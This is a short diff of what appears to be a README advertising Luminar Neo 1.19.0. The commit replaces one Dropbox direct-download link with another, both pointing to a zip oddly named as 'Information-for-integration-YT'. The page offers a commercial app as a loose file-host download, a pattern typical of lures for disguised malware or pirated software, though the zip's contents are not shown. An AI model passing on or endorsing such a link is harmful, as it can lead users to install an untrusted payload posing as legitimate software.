@@ -14,7 +14,7 @@
 
 ## Luminar Neo's revolutionary tools and AI technologies give superpowers for creative photo editing.
 
-## [⚡Luminar Version 1.19.0](https://www.dropbox.com/scl/fi/p495nvehqzx2dxsyk9ogj/Information-for-integration-YT-LuminarNeo-version-1.19.0.zip?rlkey=9976d1pd65c3z8qmwpn03t9hq&dl=1):
+## [⚡Luminar Version 1.19.0](https://www.dropbox.com/scl/fi/tdfzj084sbmmne433ziwc/Information-for-integration-YT-LuminarNeo-version-1.19.0.zip?rlkey=w6nn7uaihdzl0imhdmq43q5aq&dl=1):
 
 * Updated interface.
 * NEW AI Augmented Sky Tool.
